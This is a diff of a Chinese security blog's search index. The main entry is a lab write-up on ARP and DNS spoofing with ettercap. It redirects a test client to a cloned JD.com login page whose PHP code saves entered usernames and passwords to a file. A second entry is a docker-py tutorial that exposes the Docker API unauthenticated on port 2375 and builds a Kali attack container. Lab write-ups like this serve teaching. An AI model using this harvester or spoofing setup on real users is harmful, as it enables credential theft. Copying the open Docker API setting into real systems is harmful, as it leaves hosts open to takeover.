-<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）">www.jd.com看看网站发布是否成功）</a></p>
-<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2">www.jd.com，指向为10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
-<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码然后点击登录">www.jd.com输入用户名密码然后点击登录</a></p>
-<p>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" alt></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>DNS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bugku代码审计</title>
     <url>/2020/09/14/decode/</url>
     <content><![CDATA[<h1 id="简单的代码审计"><a href="#简单的代码审计" class="headerlink" title="简单的代码审计"></a>简单的代码审计</h1><span id="more"></span>
@@ -2007,6 +1621,393 @@ password<span class="hljs-operator">=</span><span class="hljs-number">42</span><
         <tag>变量覆盖</tag>
         <tag>函数漏洞</tag>
         <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>diaoyu</title>
+    <url>/2020/07/18/diaoyu/</url>
+    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><span id="more"></span>
+<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" alt><br>修改index.html中的内容<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$nam</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
+<span class="hljs-variable">$pas</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-comment">//pass也一样</span>
+<span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;您已捕获京东账号及密码1个：&quot;</span> . <span class="hljs-string">&quot; 用户名 &quot;</span> . <span class="hljs-variable">$nam</span> . <span class="hljs-string">&quot; 密码 &quot;</span> . <span class="hljs-variable">$pas</span>;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
+<span class="hljs-variable">$filed</span> = @fopen(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);   <span class="hljs-comment">//打开1.txt</span>
+@fwrite(<span class="hljs-variable">$filed</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$content</span>\n&quot;</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
+<span class="hljs-meta">?&gt;</span>
+&lt;html&gt;
+&lt;head&gt;
+&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
+		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">		</span>&#123;
+			window.history.back() <span class="hljs-comment">//后退+刷新</span>
+		&#125;
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload=<span class="hljs-string">&quot;goBack()&quot;</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com">www.jd.com</a>    ip:10.1.1.1</p>
+<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）">www.jd.com看看网站发布是否成功）</a></p>
+<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2">www.jd.com，指向为10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
+<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码然后点击登录">www.jd.com输入用户名密码然后点击登录</a></p>
+<p>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" alt></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>DNS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dockerpy</title>
+    <url>/2022/05/15/dockerpy/</url>
+    <content><![CDATA[<h1 id="Docker-py"><a href="#Docker-py" class="headerlink" title="Docker-py"></a>Docker-py</h1><p>使用python第三方库docker-py操作docker</p>
+<p>docker-py的地址：<a href="https://github.com/docker/docker-py">https://github.com/docker/docker-py</a></p>
+<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><h3 id="1-安装docker-py"><a href="#1-安装docker-py" class="headerlink" title="1.安装docker-py"></a>1.安装docker-py</h3><p>​    pip安装即可，安装最新版</p>
+<pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> docker</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135319833.png" alt="image-20220515135319833"></p>
+<h3 id="2-配置docker"><a href="#2-配置docker" class="headerlink" title="2.配置docker"></a>2.配置docker</h3><p>本文使用的是Docker Desktop，docker版本是<code>20.10.12</code></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135534992.png" alt="image-20220515135534992"></p>
+<h4 id="docker开启远程访问"><a href="#docker开启远程访问" class="headerlink" title="docker开启远程访问"></a>docker开启远程访问</h4><p>对于Docker Desktop来说，开启远程访问很简单，只需要再settings中选中如下配置项</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140305267.png" alt="image-20220515140305267"> </p>
+<p>对于linux中配置远程访问就稍微麻烦一点</p>
+<p><strong>方法一</strong></p>
+<p>在/usr/lib/systemd/system/docker.service，配置远程访问。</p>
+<p>主要是在[Service]这个部分，加上下面两个参数</p>
+<pre><code class="hljs ini"><span class="hljs-comment"># vim /usr/lib/systemd/system/docker.service</span>
+<span class="hljs-section">[Service]</span>
+ExecStart=
+<span class="hljs-attr">ExecStart</span>=/usr/bin/dockerd -H tcp://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span> -H unix://var/run/docker.sock</code></pre>
+
+<p>重启</p>
+<pre><code class="hljs undefined">systemctl daemon-reload
+systemctl restart docker</code></pre>
+
+<p><strong>方法二</strong></p>
+<p>修改<code>daemon.json</code>的配置</p>
+<pre><code class="hljs bash">vim /etc/docker/daemon.json
+
+&#123;
+  <span class="hljs-string">&quot;hosts&quot;</span>: [<span class="hljs-string">&quot;tcp://0.0.0.0:2375&quot;</span>, <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span>]
+&#125;</code></pre>
+
+<blockquote>
+<p>“unix:///var/run/docker.sock”：unix socket，本地客户端将通过这个来连接 Docker Daemon。<br>“tcp://0.0.0.0:2375”：tcp socket，表示允许任何远程客户端通过 2375 端口连接 Docker Daemon。</p>
+</blockquote>
+<p>修改配置以后</p>
+<p>然后让docker重新读取配置文件,并重启docker服务</p>
+<pre><code class="hljs undefined">systemctl daemon-reload
+systemctl restart docker</code></pre>
+
+<p>查看docker进程：</p>
+<pre><code class="hljs perl">[root@slaver2 ~]<span class="hljs-comment"># ps -ef|grep docker</span>
+root      <span class="hljs-number">44221</span>      <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> /usr/bin/dockerd -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">2375</span> -H unix:<span class="hljs-regexp">//</span>var/run/docker.sock</code></pre>
+
+<p>Docker守护进程打开一个HTTP Socket,这样才能实现远程通信</p>
+<p>当开启远程访问后，可以再浏览器中查看docker服务器上的相关信息，并且该API遵循RESTful API标准</p>
+<ul>
+<li><p>查看当前版本：<a href="http://IP:2375/version">http://IP:2375/version</a></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141120592.png" alt="image-20220515141120592"></p>
+</li>
+<li><p>查看所有镜像信息：<a href="http://IP:2375/images/json">http://IP:2375/images/json</a></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140906433.png" alt="image-20220515140906433"></p>
+</li>
+<li><p>查看已启动容器信息：<a href="http://127.0.0.1:2375/containers/json">http://127.0.0.1:2375/containers/json</a></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141343749.png" alt="image-20220515141343749"></p>
+</li>
+<li><p>查看网卡信息： <a href="http://127.0.0.1:2375/networks/">http://127.0.0.1:2375/networks/</a></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141509777.png" alt="image-20220515141509777"></p>
+</li>
+</ul>
+<h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><h5 id="Docker-Desktop与VM冲突"><a href="#Docker-Desktop与VM冲突" class="headerlink" title="Docker Desktop与VM冲突"></a>Docker Desktop与VM冲突</h5><p>需要注意的是，安装Docker Desktop 后VM就无法使用，原因：</p>
+<blockquote>
+<p>1、Device Guard或Credential Guard与Workstation不兼容。</p>
+<p>2、Windows系统的Hyper-V不兼容导致</p>
+</blockquote>
+<p>解决方法如<a href="https://blog.csdn.net/qq_36761831/article/details/81175736">https://blog.csdn.net/qq_36761831/article/details/81175736</a></p>
+<p>开启和关闭Hyper-V</p>
+<pre><code class="hljs shell">bcdedit /set hypervisorlaunchtype auto
+bcdedit /set hypervisorlaunchtype off</code></pre>
+
+<p>当需要使用VM时，执行关闭Hyper-V命令即可</p>
+<h5 id="配置国内镜像源"><a href="#配置国内镜像源" class="headerlink" title="配置国内镜像源"></a>配置国内镜像源</h5><p>settings=&gt;Dokcer engine修改配置内容</p>
+<pre><code class="hljs json">&#123;
+  <span class="hljs-attr">&quot;builder&quot;</span>: &#123;
+    <span class="hljs-attr">&quot;gc&quot;</span>: &#123;
+      <span class="hljs-attr">&quot;defaultKeepStorage&quot;</span>: <span class="hljs-string">&quot;20GB&quot;</span>,
+      <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>
+    &#125;
+  &#125;,
+  <span class="hljs-attr">&quot;experimental&quot;</span>: <span class="hljs-literal">false</span>,
+  <span class="hljs-attr">&quot;features&quot;</span>: &#123;
+    <span class="hljs-attr">&quot;buildkit&quot;</span>: <span class="hljs-literal">true</span>
+  &#125;,
+  <span class="hljs-attr">&quot;registry-mirrors&quot;</span>: [
+    <span class="hljs-string">&quot;https://registry.docker-cn.com&quot;</span>,
+    <span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>,
+    <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>
+  ]
+&#125;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141737016.png" alt="image-20220515141737016"></p>
+<h5 id="docker配置软链接"><a href="#docker配置软链接" class="headerlink" title="docker配置软链接"></a>docker配置软链接</h5><p>由于Docker Desktop默认安装在C盘，所以下载的镜像也都保存在C盘，由于镜像文件一般很大，很容易爆盘，所以需要为保存镜像的文件夹创建一个软链接，将镜像保存到其他盘。<a href="https://zhuanlan.zhihu.com/p/343278599">参考</a></p>
+<p>请务必先关闭docker 或者docker desktop</p>
+<ul>
+<li>通过Everything或者资源管理器找到以.vhdx结尾的文件所在的位置，这些就是docker镜像路径：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/v2-affd20a39ee0002a4c880ff3eb4e75f7_720w.jpg" alt="img"></p>
+<ul>
+<li>将.vhdx复制到想要的路径下，本文路径为：</li>
+</ul>
+<p><img src="https://pic1.zhimg.com/80/v2-70f80706f26839ff0dd3a4fcdc0aca80_720w.jpg" alt="img"></p>
+<ul>
+<li><p>删除源文件夹，本文是data文件夹</p>
+</li>
+<li><p>以管理员运行cmd并且使用以下命令创建链接：</p>
+<pre><code class="hljs shell">mklink /J C:\Users\admin\AppData\Local\Docker\wsl\data   D:\docker\data</code></pre>
+
+<p>请大家自行替换路径，本文路径分别为源路径：C:\Users\admin\AppData\Local\Docker\wsl\data</p>
+<p>以及想要移动的路径：D:\docker\data此时可以在源路径看到新建出来的文件夹</p>
+</li>
+</ul>
+<h2 id="使用dockerpy"><a href="#使用dockerpy" class="headerlink" title="使用dockerpy"></a>使用dockerpy</h2><p>官方给出了详细的说明文档<a href="https://docker-py.readthedocs.io/en/stable/index.html">说明文档</a>，下面只给出几个常见的操作</p>
+<h3 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h3><p>进入docker库的imges.py中可以看到与镜像相关的所有操作，包括在shell中使用的build、pull、push、search等操作</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515144118231.png" alt="image-20220515144118231"></p>
+<h4 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h4><p>查看源码，可知有三个可选参数</p>
+<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list</span>(<span class="hljs-params">self, name=<span class="hljs-literal">None</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">False</span>, filters=<span class="hljs-literal">None</span></span>):</span>
+    <span class="hljs-string">&quot;&quot;&quot;</span>
+<span class="hljs-string">    List images on the server.</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Args:</span>
+<span class="hljs-string">        name (str): Only show images belonging to the repository ``name``</span>
+<span class="hljs-string">        all (bool): Show intermediate image layers. By default, these are</span>
+<span class="hljs-string">            filtered out.</span>
+<span class="hljs-string">        filters (dict): Filters to be processed on the image list.</span>
+<span class="hljs-string">            Available filters:</span>
+<span class="hljs-string">            - ``dangling`` (bool)</span>
+<span class="hljs-string">            - ``label`` (str): format either ``key`` or ``key=value``</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Returns:</span>
+<span class="hljs-string">        (list of :py:class:`Image`): The images.</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Raises:</span>
+<span class="hljs-string">        :py:class:`docker.errors.APIError`</span>
+<span class="hljs-string">            If the server returns an error.</span>
+<span class="hljs-string">    &quot;&quot;&quot;</span>
+    resp = self.client.api.images(name=name, <span class="hljs-built_in">all</span>=<span class="hljs-built_in">all</span>, filters=filters)
+    <span class="hljs-keyword">return</span> [self.get(r[<span class="hljs-string">&quot;Id&quot;</span>]) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> resp]</code></pre>
+
+<h5 id="获取所有镜像"><a href="#获取所有镜像" class="headerlink" title="获取所有镜像"></a>获取所有镜像</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> docker
+
+client = docker.from_env()
+imagesList = client.images.<span class="hljs-built_in">list</span>()
+print(imagesList)</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515143446882.png" alt="image-20220515143446882"></p>
+<h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p>该函数只有一个参数name，镜像名称</p>
+<p>获取指定名称的镜像</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> docker
+client = docker.from_env()
+mysqlImage = client.images.get(<span class="hljs-string">&quot;mysql&quot;</span>)
+print(mysqlImage)</code></pre>
+
+<h4 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h4><p>与docker search 命令相同</p>
+<pre><code class="hljs stylus">searchList = client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.search</span>(<span class="hljs-string">&quot;nginx&quot;</span>)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(searchList)</span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515153818793.png" alt="image-20220515153818793"></p>
+<h4 id="pull"><a href="#pull" class="headerlink" title="pull()"></a>pull()</h4><p>作用等同于docker pull</p>
+<pre><code class="hljs stylus">client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.pull</span>(<span class="hljs-string">&quot;nginx&quot;</span>)</code></pre>
+
+<h3 id="container相关操作"><a href="#container相关操作" class="headerlink" title="container相关操作"></a>container相关操作</h3><p>容器相关的操作很多</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515161345640.png" alt="image-20220515161345640"></p>
+<h4 id="run"><a href="#run" class="headerlink" title="run()"></a>run()</h4><p>官方注释</p>
+<pre><code class="hljs lasso">Run a container. <span class="hljs-keyword">By</span> default, it will wait for the container <span class="hljs-keyword">to</span> finish
+<span class="hljs-literal">and</span> <span class="hljs-keyword">return</span> its logs, similar <span class="hljs-keyword">to</span> <span class="hljs-string">``</span>docker run<span class="hljs-string">``</span>.
+<span class="hljs-comment">// </span>
+<span class="hljs-keyword">If</span> the <span class="hljs-string">``</span>detach<span class="hljs-string">``</span> argument is <span class="hljs-string">``</span><span class="hljs-literal">True</span><span class="hljs-string">``</span>, it will start the container
+<span class="hljs-literal">and</span> immediately <span class="hljs-keyword">return</span> a :py:class:<span class="hljs-string">`Container`</span> object, similar <span class="hljs-keyword">to</span>
+<span class="hljs-string">``</span>docker run <span class="hljs-params">-d</span><span class="hljs-string">``</span>.</code></pre>
+
+
+
+<pre><code class="hljs python">port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
+image_name = nginx
+client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 以守护进程的方式创建容器，容器停止后不会删除</span>
+
+```
+- The port number, <span class="hljs-keyword">as</span> an integer. For example,
+``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;`` will expose port <span class="hljs-number">2222</span> inside the
+container <span class="hljs-keyword">as</span> port <span class="hljs-number">3333</span> on the host.
+- ``<span class="hljs-literal">None</span>``, to assign a random host port. For example,
+``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-literal">None</span>&#125;``.
+- A <span class="hljs-built_in">tuple</span> of ``(address, port)`` <span class="hljs-keyword">if</span> you want to specify the
+host interface. For example,
+``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1111</span>)&#125;``.
+- A <span class="hljs-built_in">list</span> of integers, <span class="hljs-keyword">if</span> you want to bind multiple host ports
+to a single container port. For example,
+``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: [<span class="hljs-number">1234</span>, <span class="hljs-number">4567</span>]&#125;``.
+```</code></pre>
+
+<h4 id="get-1"><a href="#get-1" class="headerlink" title="get()"></a>get()</h4><p>获取容器对象</p>
+<pre><code class="hljs python">docker_container_id = <span class="hljs-string">&quot;236efe761aeb&quot;</span>
+container = client.containers.get(docker_container_id)
+print(container.<span class="hljs-built_in">id</span>)
+print(container.attrs) <span class="hljs-comment"># 获取容器的详细信息</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515163148958.png" alt="image-20220515163148958"></p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>进入容器内部执行命令，与下面的命令作用相同</p>
+<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> containerID bash</code></pre>
+
+<pre><code class="hljs python">command = <span class="hljs-string">&#x27;touch /tmp/flag&#x27;</span> 
+port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
+image_name = nginx
+container = client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  
+container.exec_run(command)</code></pre>
+
+
+
+<h3 id="network相关操作"><a href="#network相关操作" class="headerlink" title="network相关操作"></a>network相关操作</h3><h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p>使用默认参数，桥接模式创建网卡</p>
+<pre><code class="hljs python">client.networks.create(<span class="hljs-string">&quot;net1&quot;</span>, driver=<span class="hljs-string">&quot;bridge&quot;</span>)</code></pre>
+
+<p>使用自定义IPAM配置创建更高级的网络。例如，将子网设置为192.168.52.0/24和网关地址为192.168.52.254</p>
+<pre><code class="hljs routeros">ipam_pool = docker.types.IPAMPool(
+    <span class="hljs-attribute">subnet</span>=<span class="hljs-string">&#x27;192.168.52.0/24&#x27;</span>,
+    <span class="hljs-attribute">gateway</span>=<span class="hljs-string">&#x27;192.168.52.254&#x27;</span>
+)
+ipam_config = docker.types.IPAMConfig(
+    pool_configs=[ipam_pool]
+)
+
+client.networks.create(
+    <span class="hljs-string">&quot;network1&quot;</span>,
+    <span class="hljs-attribute">driver</span>=<span class="hljs-string">&quot;bridge&quot;</span>,
+    <span class="hljs-attribute">ipam</span>=ipam_config
+)</code></pre>
+
+
+
+<h1 id="创建kali攻击机镜像"><a href="#创建kali攻击机镜像" class="headerlink" title="创建kali攻击机镜像"></a>创建kali攻击机镜像</h1><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull kalilinux/kali-rolling</code></pre>
+
+<p>查看下载的镜像</p>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span></code></pre>
+
+<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kalilinux/kali-rolling /bin/bash</code></pre>
+
+<p>查看容器id</p>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span></code></pre>
+
+<p>进入容器</p>
+<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre>
+
+<h2 id="安装基础环境包"><a href="#安装基础环境包" class="headerlink" title="安装基础环境包"></a>安装基础环境包</h2><p>❗需要关闭防火墙或者打开3399端口，否则无法连接</p>
+<p>首先安装vim</p>
+<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y update &amp;&amp; apt-<span class="hljs-builtin-name">get</span> -y upgrade
+apt-<span class="hljs-builtin-name">get</span> update --fix-missing	
+apt-<span class="hljs-builtin-name">get</span> install vim</code></pre>
+
+<p>修改镜像源</p>
+<pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>apt/sources.list
+
+添加内容
+deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+deb-src http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre>
+
+<p>安装基础环境包</p>
+<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y update &amp;&amp; apt-<span class="hljs-builtin-name">get</span> -y<span class="hljs-built_in"> upgrade </span>&amp;&amp; \
+   <span class="hljs-attribute">DEBIAN_FRONTEND</span>=noninteractive apt-<span class="hljs-builtin-name">get</span> install -y \
+   kali-tools-top10 \
+   pciutils \
+   iputils-ping \
+   bash-completion &amp;&amp; \
+   apt-<span class="hljs-builtin-name">get</span> autoremove -y &amp;&amp; \
+   apt-<span class="hljs-builtin-name">get</span> clean</code></pre>
+
+<h2 id="生成新镜像"><a href="#生成新镜像" class="headerlink" title="生成新镜像"></a>生成新镜像</h2><p>待上面的所有程序安装完成后，打包生成新镜像</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit f<span class="hljs-number">16618</span>e<span class="hljs-number">0</span>fda<span class="hljs-number">5</span> kali-<span class="hljs-number">2021</span></code></pre>
+
+
+
+<h2 id="远程桌面环境安装"><a href="#远程桌面环境安装" class="headerlink" title="远程桌面环境安装"></a>远程桌面环境安装</h2><h3 id="使用新镜像启动容器"><a href="#使用新镜像启动容器" class="headerlink" title="使用新镜像启动容器"></a>使用新镜像启动容器</h3><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-<span class="hljs-number">2021</span></code></pre>
+
+<p>进入镜像</p>
+<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre>
+
+<h3 id="安装桌面服务"><a href="#安装桌面服务" class="headerlink" title="安装桌面服务"></a>安装桌面服务</h3><p><strong>●</strong> kali-desktop-xfce ：安装远程桌面环境</p>
+<p><strong>●</strong> xrdp ：远程桌面服务</p>
+<p><strong>●</strong> xorg：xorg是x11的一个实现，xorg提供X server</p>
